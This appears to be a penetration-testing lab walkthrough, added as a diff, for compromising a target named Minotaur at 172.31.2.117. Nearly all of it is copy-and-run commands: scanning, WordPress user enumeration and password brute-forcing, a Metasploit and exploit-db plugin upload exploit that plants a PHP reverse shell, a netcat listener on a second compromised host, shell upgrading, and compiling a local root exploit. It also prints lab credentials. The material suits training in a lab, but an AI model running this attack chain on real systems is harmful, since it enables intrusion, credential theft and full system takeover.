@@ -1,0 +1,148 @@
+######################
+# Attacking Minotaur #
+######################
+ 
+Step 1: Portscan/Bannergrab the target host
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.117
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 2: Vulnerability scan the web server
+---------------------------Type This-----------------------------------
+nikto.pl -h 172.31.2.117
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 3: Directory brute-force the webserver
+---------------------------Type This-----------------------------------
+dirb http://172.31.2.117 /usr/share/dirb/wordlists/big.txt
+-----------------------------------------------------------------------
+ 
+### dirb output ###
+==> DIRECTORY: http://172.31.2.117/bull/
+-----------------------------------------------------------------------
+ 
+ 
+Step 4: Run wordpress vulnerability scanner
+---------------------------Type This-----------------------------------
+wpscan --url 172.31.2.117/bull/ -r --enumerate u --enumerate p --enumerate t --enumerate tt
+
+
+cewl -w words.txt http://172.31.2.117/bull/
+
+
+cewl http://172.31.2.117/bull/ -d 1 -m 6 -w whateverbro.txt
+
+wc -l whateverbro.txt 
+
+john --wordlist=whateverbro.txt --rules --stdout > words-john.txt
+
+wc -l words-john.txt
+
+wpscan --username bully --url http://172.31.2.117/bull/ --wordlist words-john.txt --threads 10
+-----------------------------------------------------------------------
+
+ 
+
+
+
+Step 5: Attack vulnerable Wordpress plugin with Metasploit (just doing the exact same attack with MSF)
+---------------------------Type This-----------------------------------
+msfconsole
+ 
+use exploit/unix/webapp/wp_slideshowgallery_upload
+ 
+set RHOST 172.31.2.117
+ 
+set RPORT 80
+ 
+set TARGETURI /bull
+ 
+set WP_USER bully
+ 
+set WP_PASSWORD Bighornedbulls
+ 
+exploit
+-----------------------------------------------------------------------
+ 
+Damn...that didn't work...Can't reverse shell from inside the network to a host in the VPN network range.
+This is a lab limitation that I implemented to stop students from compromising hosts in the lab network
+and then from the lab network attacking other students.
+ 
+ 
+---------------------------Type This-----------------------------------
+wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+ 
+tar -zxvf php-reverse-shell-1.0.tar.gz
+ 
+cd ~/toolz/php-reverse-shell-1.0/
+ 
+nano php-reverse-shell.php
+-----------------------------------------------------------------------
+    ***** change the $ip and $port variables to a host that you have already compromised in the network
+    ***** for this example I chose 172.31.2.64 and kept port 1234
+ 
+ 
+---------------------------Type This-----------------------------------
+chmod 777 php-reverse-shell.php
+cp php-reverse-shell.php ..
+-----------------------------------------------------------------------
+ 
+ 
+
+Browse to this link https://www.exploit-db.com/raw/34681/ and copy all of the text from it.
+Paste the contents of this link into a file called wp_gallery_slideshow_146_suv.py
+--------------------------Type This-----------------------------------
+python wp_gallery_slideshow_146_suv.py -t http://172.31.2.117/bull/ -u bully -p Bighornedbulls -f php-reverse-shell.php
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Set up netcat listener on previously compromised host
+---------------------------Type This-----------------------------------
+ssh -l webmin 172.31.2.64
+    webmin1980
+ 
+
+nc -lvp 1234
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+---------------------Type This in your browser ------------------------
+http://172.31.2.117/bull//wp-content/uploads/slideshow-gallery/php-reverse-shell.php
+-----------------------------------------------------------------------
+ 
+ 
+Now check your listener to see if you got the connection
+---------------------------Type This-----------------------------------
+id
+ 
+/sbin/ifconfig
+ 
+python -c 'import pty;pty.spawn("/bin/bash")'
+ 
+---------------------------Type This-----------------------------------
+cd /tmp
+cat >> exploit2.c << out
+-----------------------------------------------------------------------
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/37292/
+ 
+**************hit enter a few times *****************
+ 
+---------------------------Type This-----------------------------------
+out
+ 
+ 
+gcc -o boom2 exploit2.c
+ 
+./boom2
+ 
+id
+-----------------------------------------------------------------------
